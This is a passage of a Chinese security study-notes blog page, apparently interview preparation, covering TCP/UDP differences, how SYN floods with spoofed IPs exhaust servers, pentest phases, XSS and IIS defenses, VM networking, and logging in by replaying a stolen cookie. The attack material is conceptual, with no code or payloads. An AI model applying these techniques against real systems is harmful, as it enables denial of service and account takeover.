+<p>加入cookie，用referer来提交，无需输入帐号密码直接登录进去！</p>
+<h1 id="18-tcp、udp的区别及tcp三次握手，syn攻击？"><a href="#18-tcp、udp的区别及tcp三次握手，syn攻击？" class="headerlink" title="18.tcp、udp的区别及tcp三次握手，syn攻击？"></a>18.tcp、udp的区别及tcp三次握手，syn攻击？</h1><p>一、tcp、udp区别（转）</p>
+<p>TCP的优点：</p>
+<p>可靠，稳定</p>
+<p>TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。</p>
+<p>TCP的缺点：</p>
+<p>慢，效率低，占用系统资源高，易被攻击</p>
+<p>TCP在传递数据之前，要先建连接，这会消耗时间，而且在数据传递时，确认机制、重传机制、拥塞控制机制等都会消耗大量的时间，而且要在每台设备上维护所有的传输连接，事实上，每个连接都会占用系统的CPU、内存等硬件资源。</p>
+<p>而且，因为TCP有确认机制、三次握手机制，这些也导致TCP容易被人利用，实现DOS、DDOS、CC等攻击。</p>
+<p>UDP的优点：</p>
+<p>快，比TCP稍安全</p>
+<p>UDP没有TCP的握手、确认、窗口、重传、拥塞控制等机制，UDP是一个无状态的传输协议，所以它在传递数据时非常快。没有TCP的这些机制，UDP较TCP被攻击者利用的漏洞就要少一些。但UDP也是无法避免攻击的，比如：UDP Flood攻击……</p>
+<p>UDP的缺点：</p>
+<p>不可靠，不稳定</p>
+<p>因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。</p>
+<p>基于上面的优缺点，那么：</p>
+<p>什么时候应该使用TCP：</p>
+<p>当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。</p>
+<p>在日常生活中，常见使用TCP协议的应用如下：</p>
+<p>浏览器，用的HTTP</p>
+<p>FlashFXP，用的FTP</p>
+<p>Outlook，用的POP、SMTP</p>
+<p>Putty，用的Telnet、SSH</p>
+<p>QQ文件传输</p>
+<p>…………</p>
+<p>什么时候应该使用UDP：</p>
+<p>当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。</p>
+<p>比如，日常生活中，常见使用UDP协议的应用如下：</p>
+<p>QQ语音</p>
+<p>QQ视频</p>
+<p>TFTP</p>
+<p>二、TCP握手协议</p>
+<p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。</p>
+<p>第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；</p>
+<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），</p>
+<p>即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
+<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，</p>
+<p>客户端和服务器进入ESTABLISHED状态，完成三次握手。</p>
+<p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：</p>
+<p>未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，</p>
+<p>该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态，</p>
+<p>当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 backlog参数：表示未连接队列的最大容纳数目。</p>
+<p>SYN-ACK 重传次数　服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，</p>
+<p>进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。</p>
+<p>半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到SYN包到确认这个报文无效的最长时间，</p>
+<p>该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间。</p>
+<p>三、SYN攻击原理</p>
+<p>SYN攻击属于DOS攻击的一种，它利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源。</p>
+<p>SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，</p>
+<p>只要这些系统打开TCP服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j），</p>
+<p>将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV状态。</p>
+<p>当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。</p>
+<p>配合IP欺骗，SYN攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的IP地址，</p>
+<p>向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，</p>
+<p>服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，</p>
+<p>目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。</p>
+<h1 id="19-证书要考哪些？"><a href="#19-证书要考哪些？" class="headerlink" title="19.证书要考哪些？"></a>19.证书要考哪些？</h1><p>信息安全国际第一认证——CISSP</p>
+<p>信息安全国内认证——CISAW</p>
+<p>信息安全国内认证——CISP</p>
+<p>信息安全技术实操认证新贵——Security+</p>
+<p>IT审计人员的必备之证——CISA</p>
+<p>DVWA是如何搭建的？</p>
+<p>启动xampp（XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。）下的apache中间件和mysql</p>
+<p>将dvwa放到xampp下的htdocs目录下</p>
+<p>在浏览器输入<a href="http://127.0.0.1/dvwa" target="_blank" rel="noopener">http://127.0.0.1/dvwa</a> 即可使用啦！</p>
+<p>还有owasp的漏洞练习平台：<a href="https://sourceforge.net/projects/owaspbwa/files/" target="_blank" rel="noopener">https://sourceforge.net/projects/owaspbwa/files/</a></p>
+<h1 id="20-渗透测试的流程是什么"><a href="#20-渗透测试的流程是什么" class="headerlink" title="20.渗透测试的流程是什么"></a>20.渗透测试的流程是什么</h1><p>渗透测试流程概述</p>
+<p>前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、</p>
+<p>渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、报告阶段。</p>
+<p>攻击前：网络踩点、网络扫描、网络查点</p>
+<p>攻击中：利用漏洞信息进行渗透攻击、获取权限</p>
+<p>攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除</p>
+<h1 id="21-xss如何防御"><a href="#21-xss如何防御" class="headerlink" title="21.xss如何防御"></a>21.xss如何防御</h1><p>1.对前端输入做过滤和编码：</p>
+<p>比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检查需要在服务器端完成，在前端完成的限制是容易绕过的；</p>
+<p>对特殊字符进行过滤和转义；</p>
+<p>2.对输出做过滤和编码：在变量值输出到前端的HTML时进行编码和转义；</p>
+<p>3.给关键cookie使用http-only</p>
+<h1 id="22-IIS服务器应该做哪些方面的保护措施："><a href="#22-IIS服务器应该做哪些方面的保护措施：" class="headerlink" title="22.IIS服务器应该做哪些方面的保护措施："></a>22.IIS服务器应该做哪些方面的保护措施：</h1><p>整理来源：<a href="http://www.williamlong.info/archives/118.html" target="_blank" rel="noopener">http://www.williamlong.info/archives/118.html</a></p>
+<p>1. 保持Windows升级:</p>
+<p>2. 使用IIS防范工具</p>
+<p>3. 移除缺省的Web站点</p>
+<p>4. 如果你并不需要FTP和SMTP服务，请卸载它们</p>
+<p>5. 有规则地检查你的管理员组和服务:</p>
+<p>6. 严格控制服务器的写访问权限</p>
+<p>7. 设置复杂的密码</p>
+<p>8. 减少/排除Web服务器上的共享</p>
+<p>9. 禁用TCP/IP协议中的NetBIOS:</p>
+<p>10. 使用TCP端口阻塞</p>
+<p>11. 仔细检查<em>.bat和</em>.exe 文件: 每周搜索一次*.bat</p>
+<p>12. 管理IIS目录安全:</p>
+<p>13. 使用NTFS安全:</p>
+<p>14. 管理用户账户</p>
+<p>15. 审计你的Web服务器:</p>
+<h1 id="23-虚拟机的几种连接方式及原理"><a href="#23-虚拟机的几种连接方式及原理" class="headerlink" title="23.虚拟机的几种连接方式及原理"></a>23.虚拟机的几种连接方式及原理</h1><p>整理来源：<a href="http://blog.csdn.net/shuxiao9058/article/details/7051463" target="_blank" rel="noopener">http://blog.csdn.net/shuxiao9058/article/details/7051463</a></p>
+<p>安装完虚拟机后，默认安装了两个虚拟网卡，VMnet1和VMnet8，其他的未安装（当然也可以手动安装其他的）。其中VMnet1是host网卡，</p>
+<p>用于host方式连接网络的。VMnet8是NAT网卡，用于NAT方式连接网络的。它们的IP地址是随机生成的，如果要用虚拟机做实验的话，</p>
+<p>最好将VMnet1到VMnet8的IP地址改掉。习惯上把VMware虚拟网卡使用的网段”固定”，使用如下原则：VMnet1对应的网段是192.168.10.0，</p>
+<p>VMnet2对应的网段是192.168.20.0，其他的类似。当然平常只是随便用用的就不用改了，能上网就行了。</p>
+<p>VMware网络连接的方式主要有：桥接（Bridged）、NAT、主机网络（Host-Only）。</p>
+<p>1. Use bridged networking（使用桥接网络）</p>
+<p>说明：使用VMnet0虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的IP地址，</p>
+<p>其网络拓扑如图1所示，使用桥接方式，A，A1，A2，B可互访。</p>
+<p> 图1</p>
+<p>2. Use network address translation（NAT）</p>
+<p>说明：使用Vmnet8虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。</p>
+<p>其网络拓扑如图2所示，使用NAT方式，A1，A2可以访问B，但B不可以访问A1，A2。但A，A1，A2可以互访。</p>
+<p> 图2</p>
+<p>3. Use Host-Only networking（使用主机网络）</p>
+<p>说明：使用Vmnet1虚拟交换机，此时虚拟机只能与虚拟机、主机互访。也就是不能上Internet，其网络拓扑如图3所示，</p>
+<p>使用Host方式，A，A1，A2可以互访，但A1，A2不能访问B，也不能被B访问。</p>
+<h1 id="24-xss有cookie一定可以无用户名密码登录吗？"><a href="#24-xss有cookie一定可以无用户名密码登录吗？" class="headerlink" title="24.xss有cookie一定可以无用户名密码登录吗？"></a>24.xss有cookie一定可以无用户名密码登录吗？</h1><p>基本可以。因为把cookie的值给浏览器，浏览器去访问页面会用已有的cookie去访问，如果cookie有效，就会直接进去。</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/zerotwo/2019/10/08/wireshark入门了解/" rel="next" title="wireshark入门">
+                  <i class="fa fa-chevron-left"></i> wireshark入门
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-SSL-Strip-SSp-攻击到底是什么？"><span class="nav-number">1.</span> <span class="nav-text">1.SSL Strip(SSp)攻击到底是什么？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-中间人攻击——ARP欺骗的原理、实战及防御"><span class="nav-number">2.</span> <span class="nav-text">2.中间人攻击——ARP欺骗的原理、实战及防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是网关"><span class="nav-number">2.1.</span> <span class="nav-text">什么是网关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARP协议是什么"><span class="nav-number">2.2.</span> <span class="nav-text">ARP协议是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARP欺骗原理"><span class="nav-number">2.3.</span> <span class="nav-text">ARP欺骗原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3会话劫持原理"><span class="nav-number">3.</span> <span class="nav-text">3会话劫持原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是会话劫持"><span class="nav-number">3.1.</span> <span class="nav-text">什么是会话劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MITM攻击简介"><span class="nav-number">3.2.</span> <span class="nav-text">MITM攻击简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注射式攻击简介"><span class="nav-number">3.3.</span> <span class="nav-text">注射式攻击简介</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-CC攻击"><span class="nav-number">4.</span> <span class="nav-text">4.CC攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-添加时间戳防止重放攻击"><span class="nav-number">5.</span> <span class="nav-text">5.添加时间戳防止重放攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-浅析HTTPS中间人攻击与证书校验"><span class="nav-number">6.</span> <span class="nav-text">6.浅析HTTPS中间人攻击与证书校验</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-什么是HttpOnly"><span class="nav-number">7.</span> <span class="nav-text">7.什么是HttpOnly?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-如何设计相对安全的cookie自动登录系统"><span class="nav-number">8.</span> <span class="nav-text">8.如何设计相对安全的cookie自动登录系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-SSH"><span class="nav-number">9.</span> <span class="nav-text">9.SSH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-服务器操作系统的安全防范"><span class="nav-number">10.</span> <span class="nav-text">10.服务器操作系统的安全防范</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#11-日志文件查看"><span class="nav-number">11.</span> <span class="nav-text">11.日志文件查看</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#12-localStorage和sessionStorage区别"><span class="nav-number">12.</span> <span class="nav-text">12.localStorage和sessionStorage区别</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#13-简单的查找旁站"><span class="nav-number">13.</span> <span class="nav-text">13.简单的查找旁站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#14-对称加密非对称加密？"><span class="nav-number">14.</span> <span class="nav-text">14.对称加密非对称加密？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#15-什么是同源策略？"><span class="nav-number">15.</span> <span class="nav-text">15.什么是同源策略？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#16-cookie存在哪里？可以打开吗"><span class="nav-number">16.</span> <span class="nav-text">16.cookie存在哪里？可以打开吗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#17-xss如何盗取cookie？"><span class="nav-number">17.</span> <span class="nav-text">17.xss如何盗取cookie？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#18-tcp、udp的区别及tcp三次握手，syn攻击？"><span class="nav-number">18.</span> <span class="nav-text">18.tcp、udp的区别及tcp三次握手，syn攻击？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#19-证书要考哪些？"><span class="nav-number">19.</span> <span class="nav-text">19.证书要考哪些？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20-渗透测试的流程是什么"><span class="nav-number">20.</span> <span class="nav-text">20.渗透测试的流程是什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#21-xss如何防御"><span class="nav-number">21.</span> <span class="nav-text">21.xss如何防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#22-IIS服务器应该做哪些方面的保护措施："><span class="nav-number">22.</span> <span class="nav-text">22.IIS服务器应该做哪些方面的保护措施：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#23-虚拟机的几种连接方式及原理"><span class="nav-number">23.</span> <span class="nav-text">23.虚拟机的几种连接方式及原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#24-xss有cookie一定可以无用户名密码登录吗？"><span class="nav-number">24.</span> <span class="nav-text">24.xss有cookie一定可以无用户名密码登录吗？</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/zerotwo/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/zerotwo/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">Kategorien</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/zerotwo/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/zerotwo/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/zerotwo/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/zerotwo/js/utils.js?v=7.4.0"></script><script src="/zerotwo/js/motion.js?v=7.4.0"></script>
+<script src="/zerotwo/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/zerotwo/js/next-boot.js?v=7.4.0"></script><script src="/zerotwo/js/bookmark.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/zerotwo/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
